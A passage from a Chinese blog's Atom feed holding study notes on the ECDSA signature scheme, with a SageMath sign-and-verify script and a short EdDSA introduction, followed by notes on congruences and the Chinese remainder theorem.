O<br>$$</p><ul><li><p>必要参数：</p><ul><li>私钥：$d_A\in[1,n-1]$此为一个数。公钥：$Q_A=d_A*G$(此为一个点)。</li><li>需要进行数字签名的消息<code>m</code>，并计算该消息的哈希值$h=Hash(m)$</li><li>生成一个随机数$k\in(1,n-1)$</li></ul></li><li><p>签名过程：</p><ul><li>计算$k*G=(x_1,y_1)$</li><li>计算$r=x_1~mod(~n)$</li><li>计算$s=k^{-1}*(h+rd_A)~mod(~n)$</li><li>最后得到签名对$(r,s)$</li></ul></li><li><p>验证过程：</p><ul><li>先判断$1&lt;r,s&lt;n$，如果不在此范围内说明消息被修改</li><li>计算$u_1\equiv h<em>s^{-1}\equiv h</em>k*(h+rd_A)^{-1}~mod(~n)$</li><li>计算$u_2\equiv rs^{-1}~mod(~n)$</li><li>计算$u_1<em>G+u_2</em>Q_A$，取最后的结果$x_1$，如果$x_1=r$就说明验证成功</li><li>验证的准确性：</li></ul></li></ul><p>$$<br>\begin{align}<br>u_1<em>G+u_2</em>Q_A&amp;=h<em>s^{-1}<em>G+rs^{-1}<em>Q_A<br>\&amp;=s^{-1}</em>(h</em>G+r</em>Q_A)<br>\&amp;=s^{-1}<em>(h</em>G+r<em>d_A</em>G)<br>\&amp;=s^{-1}<em>(h+r</em>d_A)<em>G<br>\&amp;=k</em>(h+r<em>d_A)^{-1}</em>(h+r*d_A)<em>G<br>\&amp;=k</em>G=(x_1,y_1)<br>\end{align}<br>$$</p><h2 id="算法实现">算法实现</h2><ul><li><code>ECDSA</code>签名和认证的代码如下，使用<code>Sagemath</code>进行编写：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">115792089237316195423570985008687907853269984665640564039457584007908834671663</span> <span class="comment"># 定义模数</span></span><br><span class="line">a = <span class="number">0</span>   <span class="comment"># 定义椭圆曲线的参数</span></span><br><span class="line">b = <span class="number">7</span>   <span class="comment"># 定义椭圆曲线的参数</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b]) <span class="comment"># 定义椭圆曲线 y^2 = x^3 + 7 mod p</span></span><br><span class="line">m = <span class="string">b&#x27;this_is_message&#x27;</span> <span class="comment"># 确定一个消息</span></span><br><span class="line">h = <span class="built_in">int</span>.from_bytes(hashlib.sha256(m).digest(),<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 计算消息的哈希值</span></span><br><span class="line">n = E.order() <span class="comment"># 获取椭圆曲线上的阶</span></span><br><span class="line">G = E.gens()[<span class="number">0</span>] <span class="comment"># 获取椭圆曲线的基点</span></span><br><span class="line">k = random.randint(<span class="number">2</span>,n-<span class="number">1</span>)</span><br><span class="line">d = random.randint(<span class="number">1</span>,n-<span class="number">1</span>)</span><br><span class="line">Q = d*G</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 椭圆曲线E为:&quot;</span>,E)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 椭圆曲线E的阶n为:&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 椭圆曲线E的基点G为:&quot;</span>,G)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 消息m为:&quot;</span>,m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 消息m对应的哈希值h为:&quot;</span>,h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 数字签名所使用的密钥d为:&quot;</span>,d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 数字签名所使用的随机数k为:&quot;</span>,k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 数字签名所使用的公钥Q为:&quot;</span>,Q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 签名过程</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n-------------签名过程----------------&quot;</span>)</span><br><span class="line">r = <span class="built_in">int</span>((k*G).x())% n <span class="comment"># 计算数字签名其中一个参数r</span></span><br><span class="line">k_1 = inverse_mod(k,n) <span class="comment"># 计算k在阶n下的逆元</span></span><br><span class="line">s = k_1*(h+r*d) % n <span class="comment"># 计算数字签名另一个参数s</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 数字签名参数r为:&quot;</span>,r)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 数字签名参数s为:&quot;</span>,s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n-------------验证过程----------------&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="number">1</span>&lt; r &lt; n <span class="keyword">and</span> <span class="number">1</span>&lt; s &lt; n) <span class="comment"># 确保r,s在(1,n)之间</span></span><br><span class="line">s_1 = inverse_mod(s,n) <span class="comment"># 求s_1在mod n下的逆元</span></span><br><span class="line">u1 = (h * s_1) % n <span class="comment"># 计算中间量u1</span></span><br><span class="line">u2 = r*s_1 % n     <span class="comment"># 计算中间量u2</span></span><br><span class="line">T = u1*G + u2*Q    <span class="comment"># 计算要验证的值</span></span><br><span class="line">x_1 = <span class="built_in">int</span>(T.x())</span><br><span class="line"><span class="keyword">assert</span>(x_1 == r)</span><br><span class="line">log.success(<span class="string">&quot;数字签名验证成功&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="eddsa">EdDSA</h1><ul><li><code>EdDSA</code>英文全称为<code> Edwards-curve Digital Signature Algorithm</code>，其中文意思为，<strong>爱德华兹曲线数字签名算法</strong>，而爱德华兹曲线其实是如下形式的一个椭圆曲线：</li></ul><p>$$<br>x^2+y^2=1+dx^2y^2<br>$$</p><ul><li>所以<code>EdDSA</code>本质上也是椭圆曲线数字签名算法，但是要与最常见的<code>ECDSA</code>椭圆曲线数字签名算法区别开。</li></ul>]]></content>
    
    
    <summary type="html">前言：ECDSA好像变成出题热门方向了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="数字签名" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
    
  </entry>
  
  <entry>
    <title>数论基础-同余式</title>
    <link href="http://iyheart.github.io/2025/07/17/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/"/>
    <id>http://iyheart.github.io/2025/07/17/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/</id>
    <published>2025-07-17T02:35:07.000Z</published>
    <updated>2025-08-13T02:20:37.057Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本概念和一次同余式">基本概念和一次同余式</h1><h2 id="基本概念">基本概念</h2><blockquote><p><strong>同余式的定义</strong>：设$m\in Z_{+},f(x)=a_nx_n+a_{n-1}x^{n-1}+…+a_{1}x+a_0,a_i\in Z$，则$f(x)\equiv0(~mod~m)$叫做模m的同余式，若$a_i\not\equiv 0~(mod~m)$，则n叫做上述同余式的次数。</p><p><strong>同余式解的定义</strong>：若a是使得$f(a)\equiv0~(mod~m)$成立的一个整数，则称a所在的模m的剩余类$k_a$为同余式的一个解(一类解)，记为$x\equiv a~(mod~m)$</p></blockquote><h2 id="一次同余式">一次同余式</h2><blockquote><p><strong>一次同余式</strong>：形如$ax\equiv b~(mod~m)$，且满足$a\not\equiv 0~(mod~m)$，这样形式的式子称为一次同余式。</p><p><strong>定理1</strong>：一次同余式$ax\equiv b~(mod~m),a\not\equiv 0~(mod~m)~~$当$(a,m)=1$时有唯一解。即当未知数系数与模数互质的时候有唯一解。</p><p><strong>定理2</strong>：设$(a,m)=d$，则一次同余式$ax\equiv b~(mod~m),a\not\equiv 0~(mod~m)~~$,有解的充分必要条件是$d\mid b$，当该同余式有解时，它恰好有d个解</p></blockquote><h2 id="解一次同余方程">解一次同余方程</h2><ul><li>熟悉完定理1和定理2的推导过程，其实可以了解到解一次同余方程其实就是解不定方程。下面俩个例题给出解同余方程的步骤。</li></ul><blockquote><p><strong>求解同余方程步骤</strong>：</p><ol><li>先求解$gcd(a,m)$，判断<code>a</code>和<code>m</code>是否互素。当$gcd(a,m)$互素可以得到该方程有唯一解，当不互素的时候令$gcd(a,m)=d$，判断<code>d</code>是否能整除b，能整除就说明有d个解，不能整除就说明该同余方程无解</li><li><strong>当$gcd(a,m)=1$时</strong>，直接去解二元不定方程$as+mt=1$，求出<code>s</code>，得到唯一解为$x\equiv bs~mod(~m)$，就结束了。</li><li>**当$gcd(a,m)=d$**并且同余方程有解时，我们就要将题目所给的同余方程中的<code>a、b、m</code>都除以<code>d</code>，得到一个唯一解的同余方程$a_1x\equiv b_1~mod(~m_1)$，通过解二元不定方程$as+mt=1$，求出<code>s</code>，得到$a_1x\equiv b_1~mod(~m_1)$唯一解$x\equiv b_1s~mod(~m_1)$</li><li>求出原同余方程$ax\equiv b~mod(~m)$的解，其解为$x\equiv b_1s + km_1~mod(~m),k=0,1,…,d-1$</li></ol></blockquote><p><strong>例题1</strong>：求一次同余方程$2x\equiv 3~(mod~5)$的所有解</p><p><strong>例题2</strong>：求一次同余方程$4x\equiv 6(mod~10)$的所有解</p><h1 id="中国剩余定理crt">中国剩余定理(CRT)</h1><p>中国剩余定理的个人认为算是基础部分最重要的一个定理，也是密码学中非常重要的一个定理。而<code>二次互反律</code>则是整个初等数论最重要的定理(听b站某位老师说的)。</p><ul><li>中国剩余定理是用来解同余方程组的，该同余方程组形式如下，特征有三个：<ul><li>未知数只有一个<code>x</code></li><li>每个同余式的<strong>模数不一样</strong>，但是一般要满足<code>gcd(m1,m2,...,mk)=1</code>才有解，否则需要使用拓展中国剩余定理</li><li>每个同余式中<code>b</code>的值可以一样，也可以不一样</li></ul></li></ul><p>$$<br>\begin{cases}<br>x \equiv b_1(~mod~m_1)\<br>x \equiv b_2(~mod~m_2)\<br>…\<br>x \equiv b_k(~mod~m_k)<br>\end{cases}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(1)<br>$$</p><ul><li>先来说解法再说其相关定理,这里默认$gcd(m_1,m_2,…,m_k)=1$，按照从左到右的顺序计算出如下数据。</li></ul><table><thead><tr><th>除数</th><th>余数</th><th>除数最小公倍数</th><th>衍数</th><th>乘率</th><th>各总</th></tr></thead><tbody><tr><td>$m_1$</td><td>$b_1$</td><td>$m_1*m_2…m_k=m$</td><td>$M_1=\frac{m}{m_1}$</td><td>$y_1=M_1^{-1}~(mod~m_1)$</td><td>$b_1<em>M_1</em>y_1$</td></tr><tr><td>$m_2$</td><td>$b_2$</td><td>$m_1*m_2…m_k=m$</td><td>$M_2=\frac{m}{m_2}$</td><td>$y_2=M_2^{-1}~(mod~m_2)$</td><td>$b_2<em>M_2</em>y_2$</td></tr><tr><td>…</td><td>…</td><td>$m_1*m_2…m_k=m$</td><td>…</td><td>…</td><td></td></tr><tr><td>$m_k$</td><td>$b_k$</td><td>$m_1*m_2…m_k=m$</td><td>$M_k=\frac{m}{m_k}$</td><td>$y_k=M_k^{-1}~(mod~m_k)$</td><td>$b_k<em>M_k</em>y_3$</td></tr></tbody></table><ul><li>最后得到其中一个解：</li></ul><p>$$<br>x\equiv b_1<em>M_1</em>y_1 + b_2<em>M_2</em>y_2+…+b_k<em>M_k</em>y_k~mod(~m)<br>$$</p><blockquote><p><strong>定理1(中国剩余定理)</strong>:</p><p>设$m_1,m_2,…,m_k$是k个<strong>两两互素</strong>的正整数，$m=m_1m_2…m_k,m=m_iM_i(i=1,2,…,k)$，则同余式组<code>(1)</code>的解为：<br>$$<br>x\equiv M_1’M_1b_1+M_2’M_2b_2+…+M_k’M_kb_k~~~~~~(2)<br>$$<br>其中$M_i’M_i\equiv1(~mod~m_i),i=1,2,…,k$</p><p><strong>定理2</strong>：</p><p>若$b_1,b_2,…,b_k$分别过模$m_1,m_2,…,m_k$的完全剩余系，则<code>(2)</code>过模$m=m_1m_2…m_k$的完全剩余系。</p></blockquote><h1 id="高次同余式的解数及解法">高次同余式的解数及解法</h1><h2 id="相关定理">相关定理</h2><blockquote><p><strong>定理1</strong>：</p><p>若$m_1,m_2,…,m_k$是k个两两互素的正整数，$m=m_1<em>m_2</em>…*m_k$,则同余式$f(x)\equiv0(~mod~m)$与下面同余式组等价(即任意适合$f(x)\equiv0(~mod~m)$都适合如下式子，反之也成立)。<br>$$<br>f(x)\equiv0(~mod~m_i),i=1,2,…,k<br>$$<br>并且若用$T_i$表示$f(x)\equiv0(mod~m_i),i=1,2,…,k$对模$m_i$的解数，T表示$f(x)\equiv0(~mod~m)$的解数,则解数之间有如下关系<br>$$<br>T=T_1T_2…T_K<br>$$</p></blockquote><blockquote><p><strong>定理2——命题1</strong>：</p><p>设$\alpha$是大于等于2的正整数,则适合$f(x)\equiv0~(mod~p^{\alpha})$,p为素数。适合上式的每个整数都适合同余式$f(x)\equiv 0~(p^{\alpha-1})$。</p><p>进而适合$f(x)\equiv0~(mod~p^{\alpha})$的每个正数都适合同余式$f(x)\equiv0~(mod~p)$。</p><p>因此解$f(x)\equiv0~(mod~p^{\alpha})$，可以转换为求$f(x)\equiv0~(mod~p^{\alpha})$的解。</p><p><strong>定理2</strong>：</p><p>设$x\equiv x_1~(mod~p)$即$x=x_1+pt_1,t\in Z$是$f(x)\equiv0~(mod~p)$的一解，并且$p\nmid f’(x_1)$($f’(x)$是$f(x)$的导函数），</p><p>则$x=x_1+pt_1$刚好给出$f(x)\equiv0~(mod~p^{\alpha})$的一解，对于模$p^{\alpha}$来说：<br>$$<br>x=x_{\alpha}+p^{\alpha}t_{\alpha},t_{\alpha}\in Z<br>$$<br>即$x\equiv x_{\alpha}(~mod~p^{\alpha})$，其中$x_{\alpha}\equiv x_1~mod(~p)$</p></blockquote><h2 id="解高次同余式">解高次同余式</h2><p>情形一：<br>$$<br>f(x)\equiv0(~mod~m)\<br>m=m_1m_2…m_k<br>$$</p><blockquote><p>解法：</p><ol><li>利用定理一将同余式转化为$f(x)\equiv0(~mod~m_i),i=1,2,…,k$</li><li>分别解出这些转化后的同余方程的解</li><li>列出同余方程组，使用<code>CRT</code>即可求得原方程的解</li></ol><p>$$<br>\begin{cases}<br>x\equiv b_1 ~(mod~m_1)\<br>x\equiv b_2 ~(mod~m_2)\<br>…\<br>x\equiv b_k ~(mod~m_k)<br>\end{cases}<br>$$</p></blockquote><p>情形二：<br>$$<br>f(x)\equiv0(~mod~p^{\alpha})<br>$$</p><blockquote><p>解法：</p><ol><li><p>转化为解同余方程$f(x)\equiv0~(mod~p)$的解</p></li><li><p>求出$f(x)\equiv0~(mod~p)$的解后可以得到$x=x_1+pt_1,t\in Z$，将$x_1$带入$f(x)+f’(x)*pt_1\equiv0(mod~p^{2})$，并求出$t_1\equiv x_2~(mod~p^{2})$，这样就有$t_1=x_2+p^{2}*t_2$</p></li><li><p>将$t_1=x_2+p^{2}<em>t_2$带回去$x=x_1+pt_1$，可以得到$x=x_1+p</em>(x_2+p^{3}<em>t_2)=(x_1+p</em>x_2)+p^{3}t_2$从而得到$x\equiv x_1+p*x_2~mod(~p^{2})$</p></li><li><p>之后将$x=(x_1+p*x_2)+p^{3}t_2$，带入到$f(x)+f’(x)*p^{2}t_2\equiv0(mod~p^{3})$并且重复<code>2、3</code>步骤，直到带回到$f(x)\equiv0(~mod~p^{\alpha})$</p></li></ol></blockquote><p>情形三：<br>$$<br>f(x)\equiv0(~mod~m)\<br>m=p_1^{\alpha_1}p_2^{\alpha_2}…p^{\alpha_{n}}<br>$$</p><blockquote><ol><li><p>先使用定理一，将同余方程转换为$f(x)\equiv0(~mod~p_i^{\alpha_i})$，即转换为情形二的情况</p></li><li><p>根据情形二的情况去解出$f(x)\equiv0(~mod~p_i^{\alpha_i})$的解，每组方程都需要求出解。</p></li><li><p>求出每个方程的所有解后，可以构造出如下同余方程组，使用<code>CRT</code>，即可求出情形三的所有解：</p></li></ol><p>$$<br>\begin{cases}<br>x\equiv b_1 ~(mod~p^{\alpha_1}_1)\<br>x\equiv b_2 ~(mod~p^{\alpha_2}_2)\<br>…\<br>x\equiv b_k ~(mod~p^{\alpha_k}_k)<br>\end{cases}<br>$$</p></blockquote><h1 id="素数模的同余式">素数模的同余式</h1><p>主要是利用如下定理化简<strong>素数模的多项式同余式</strong></p><blockquote><p><strong>定理1</strong>：</p><p>设p是素数，则同余式$f(x)=a_nx^{n}+a_{n-1}x^{n-1}+…+a_0 \equiv 0(~mod~p),a_n\not\equiv 0~mod(~p)$，与一个次数不超过<code>p-1</code>的素数模<code>p</code>同余式等价。</p><p><strong>定理2</strong>：</p><p>设$k≤n,x\equiv \alpha_i(~mod~p)(i=1,2,…,k)$是同余式$f(x)=a_nx^{n}+a_{n-1}x^{n-1}+…+a_0 \equiv 0(~mod~p),a_n\not\equiv 0~mod(~p)$的k个不同解，则对任何整数x来说，有如下式子：<br>$$<br>f(x)\equiv(x-\alpha_1)(x-\alpha_2)…(x-\alpha_k)f_k(x)(~mod~p)<br>$$<br>其中$f_k(x)$是首项系数$a_n$的$n-k$次多项式.</p><p><strong>定理3——(1)</strong>：</p><p>对于任何整数x来说，都有如下式子：<br>$$<br>x^{p-1}\equiv(x-1)(x-2)…(x-(p-1))~(mod~p)<br>$$</p><p><strong>定理3——(2)</strong>：又称威尔逊定理<br>$$<br>(p-1)!+1\equiv0(~mod~p)<br>$$</p><p><strong>定理4</strong>：</p><p>同余式$f(x)=a_nx^{n}+a_{n-1}x^{n-1}+…+a_0 \equiv 0(~mod~p),a_n\not\equiv 0~mod(~p)$的解数不超过它的次数。</p><p><strong>定理5——命题1</strong>:</p><p>同余式$f(x)=a_nx^{n}+a_{n-1}x^{n-1}+…+a_0 \equiv 0(~mod~p),a_n\not\equiv 0~mod(~p)$总和某个次数的首一同余式等价。</p><p><strong>定理5</strong>：</p><p>若$n≤p$，则同余式$f(x)=x^{n}+a_{n-1}x^{n-1}+…+a_0 \equiv 0(~mod~p)$，有n个解的充分必要条件是$(x^{p}-x)/f(x)$所得余式的一切系数都是p的倍数。</p></blockquote>]]></content>
    
    
    <summary type="html">记录同余方程的相关笔记</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="数论" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%95%B0%E8%AE%BA/"/>
    
    
  </entry>
  
</feed>
